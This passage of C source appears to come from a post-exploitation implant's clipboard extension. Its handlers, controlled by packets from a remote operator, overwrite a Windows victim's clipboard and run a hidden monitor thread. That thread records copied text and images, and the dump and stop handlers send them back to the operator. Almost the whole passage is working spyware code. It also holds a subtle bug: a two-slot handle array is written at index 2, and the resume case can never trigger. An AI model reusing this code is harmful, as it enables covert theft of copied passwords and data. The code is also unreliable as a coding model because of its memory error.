			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Failed to allocate clipboard memory", dwResult);
		}

		lpLockedData = (PCHAR)pGlobalLock(hClipboardData);

		memcpy_s(lpLockedData, cbStringBytes, lpClipString, cbStringBytes);

		pGlobalUnlock(hClipboardData);

		// Try to get a lock on the clipboard
		if (!pOpenClipboard(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
		}

		// Clear the clipboard data
		pEmptyClipboard();

		if (!pSetClipboardData(CF_TEXT, hClipboardData))
		{
			dwResult = GetLastError();
			dprintf("[EXTAPI CLIPBOARD] Failed to set the clipboad data: %u", dwResult);
		}
		else
		{
			dwResult = ERROR_SUCCESS;
		}

		pCloseClipboard();

	} while (0);

	// If something went wrong and we have clipboard data, then we need to
	// free it up because the clipboard can't do it for us.
	if (dwResult != ERROR_SUCCESS && hClipboardData != NULL)
	{
		pGlobalFree(hClipboardData);
	}

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
{
#ifdef _WIN32
	DWORD dwResult;
	BOOL bTerminate = FALSE;
	HANDLE waitableHandles[2] = {0};
	MSG msg;
	ClipboardState* pState = (ClipboardState*)thread->parameter1;

	do
	{
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Thread state is NULL", ERROR_INVALID_PARAMETER);
		}

		dwResult = create_clipboard_monitor_window(pState);
		if (dwResult != ERROR_SUCCESS)
		{
			break;
		}

		// signal to the caller that our thread has started
		dprintf("[EXTAPI CLIPBOARD] Thread started");
		pState->bRunning = TRUE;
		event_signal(pState->hResponseEvent);

		waitableHandles[0] = thread->sigterm->handle;
		waitableHandles[1] = pState->hPauseEvent->handle;
		waitableHandles[2] = pState->hResumeEvent->handle;

		while (!bTerminate)
		{
			dwResult = WaitForMultipleObjects(2, waitableHandles, FALSE, 1) - WAIT_OBJECT_0;

			switch (dwResult)
			{
			case 0: // stop the thread
				dprintf("[EXTAPI CLIPBOARD] Thread stopping");
				bTerminate = TRUE;
				break;
			case 1: // pause the thread
				dprintf("[EXTAPI CLIPBOARD] Thread paused");
				pState->bRunning = FALSE;
				// indicate that we've paused
				event_signal(pState->hResponseEvent);
				break;
			case 2: // resume the thread
				dprintf("[EXTAPI CLIPBOARD] Thread resumed");
				pState->bRunning = TRUE;
				// indicate that we've resumed
				event_signal(pState->hResponseEvent);
				break;
			default:
				// timeout, so pump messages
				if (pState->hClipboardWindow && PeekMessageA(&msg, pState->hClipboardWindow, 0, 0, PM_REMOVE))
				{
					TranslateMessage(&msg);
					DispatchMessageA(&msg);
				}
				break;
			}
		}

		// and we're done, switch off, and tell the caller we're done
		pState->bRunning = FALSE;
		destroy_clipboard_monitor_window(pState);
		event_signal(pState->hResponseEvent);
		dprintf("[EXTAPI CLIPBOARD] Thread stopped");

	} while (0);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

VOID destroy_clipboard_monitor_state(ClipboardState* pState)
{
	dprintf("[EXTAPI CLIPBOARD] Destroying clipboard monitor state");
	if (pState != NULL)
	{
		if (pState->hThread != NULL)
		{
			thread_destroy(pState->hThread);
		}
		if (pState->hPauseEvent != NULL)
		{
			event_destroy(pState->hPauseEvent);
		}
		if (pState->hResumeEvent != NULL)
		{
			event_destroy(pState->hResumeEvent);
		}
		if (pState->hResponseEvent != NULL)
		{
			event_destroy(pState->hResponseEvent);
		}
		destroy_clipboard_monitor_capture(&pState->captureList, TRUE);

		free(pState);
	}
}

DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	ClipboardState* pState = NULL;
	char* lpClassName = NULL;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
		}

		if (gClipboardState != NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread already running", ERROR_ALREADY_INITIALIZED);
		}

		dprintf("[EXTAPI CLIPBOARD] Starting clipboard monitor");

		pState = (ClipboardState*)malloc(sizeof(ClipboardState));
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard state", ERROR_NOT_ENOUGH_MEMORY);
		}

		dprintf("[EXTAPI CLIPBOARD] pState %p", pState);
		memset(pState, 0, sizeof(ClipboardState));

		lpClassName = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_MON_WIN_CLASS);
		if (lpClassName == NULL || strlen(lpClassName) == 0)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Window class name is missing", ERROR_INVALID_PARAMETER);
		}

		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
		dprintf("[EXTAPI CLIPBOARD] Class Name set to %s", pState->cbWindowClass);

		pState->bCaptureImageData = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);

		pState->hPauseEvent = event_create();
		pState->hResumeEvent = event_create();
		pState->hResponseEvent = event_create();
		pState->captureList.pClipboardCaptureLock = lock_create();

		if (pState->hPauseEvent == NULL
			|| pState->hResumeEvent == NULL
			|| pState->hResponseEvent == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard events", ERROR_NOT_ENOUGH_MEMORY);
		}

		pState->hThread = thread_create((THREADFUNK)clipboard_monitor_thread_func, pState, NULL, NULL);

		if (pState->hThread == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard thread", ERROR_NOT_ENOUGH_MEMORY);
		}

		gClipboardState = pState;
		thread_run(pState->hThread);

		// 4 seconds should be long enough for the thread to indicate it's started, if not, bomb out
		if (!event_poll(pState->hResponseEvent, 4000))
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Thread failed to start correctly", ERROR_ABANDONED_WAIT_0);
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	if (dwResult != ERROR_SUCCESS)
	{
		destroy_clipboard_monitor_state(pState);
		gClipboardState = NULL;
	}

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD clipboard_monitor_pause(ClipboardState* pState)
{
	if (pState->bRunning)
	{
		event_signal(pState->hPauseEvent);
		event_poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

DWORD clipboard_monitor_resume(ClipboardState* pState)
{
	if (!pState->bRunning)
	{
		event_signal(pState->hResumeEvent);
		event_poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

DWORD request_clipboard_monitor_pause(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[EXTAPI CLIPBOARD] Pausing clipboard monitor");

		dwResult = clipboard_monitor_pause(gClipboardState);
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD request_clipboard_monitor_resume(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[EXTAPI CLIPBOARD] Resuming clipboard monitor");

		dwResult = clipboard_monitor_resume(gClipboardState);
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bDump = TRUE;
	BOOL bIncludeImages = TRUE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[EXTAPI CLIPBOARD] Stopping clipboard monitor");
		bDump = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DUMP);
		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);

		// now stop the show
		event_signal(gClipboardState->hThread->sigterm);

		// if they don't terminate in a reasonable period of time...
		if (!event_poll(gClipboardState->hResponseEvent, 10000))
		{
			// ... FINISH HIM!
			dprintf("[EXTAPI CLIPBOARD] Brutally terminating the thread for not responding fast enough");
			thread_kill(gClipboardState->hThread);
		}
		
		if (bDump)
		{
			dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, TRUE);
		}

		destroy_clipboard_monitor_state(gClipboardState);
		gClipboardState = NULL;
		dwResult = ERROR_SUCCESS;
	} while (0);

	packet_transmit_response(dwResult, remote, pResponse);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD request_clipboard_monitor_dump(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bIncludeImages = TRUE;
	BOOL bPurge = TRUE;
	Packet *pResponse = packet_create_response(packet);

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}
		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
		bPurge = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_PURGE);

		dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, bPurge);

		dwResult = ERROR_SUCCESS;
	} while (0);

	packet_transmit_response(dwResult, remote, pResponse);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}